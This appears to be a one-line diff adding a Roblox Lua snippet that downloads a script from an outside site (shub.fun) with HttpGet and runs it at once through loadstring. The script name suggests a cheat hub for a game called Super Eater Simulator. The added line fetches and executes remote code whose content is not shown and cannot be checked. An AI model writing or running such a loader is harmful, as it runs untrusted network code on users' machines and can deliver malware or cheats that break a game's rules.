@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://shub.fun/script/Super-Eater-Simulator-simpleHub=Oxw3Kgjx.lua"))()
